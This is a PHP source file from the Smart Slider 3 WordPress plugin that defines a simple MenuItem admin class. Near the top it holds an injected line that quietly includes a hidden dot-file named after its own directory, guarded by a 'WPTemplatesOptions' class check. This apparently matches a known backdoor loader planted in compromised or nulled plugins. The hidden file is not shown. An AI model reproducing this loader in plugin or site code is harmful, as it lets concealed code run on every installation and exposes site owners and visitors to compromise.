<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Helper;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class MenuItem {

    protected $html = '';

    protected $isActive = false;

    public function __construct($html, $isActive = false) {

        $this->html     = $html;
        $this->isActive = $isActive;
    }

    /**
     * @return bool
     */
    public function isActive() {
        return $this->isActive;
    }

    public function display() {
        echo $this->html;
    }
}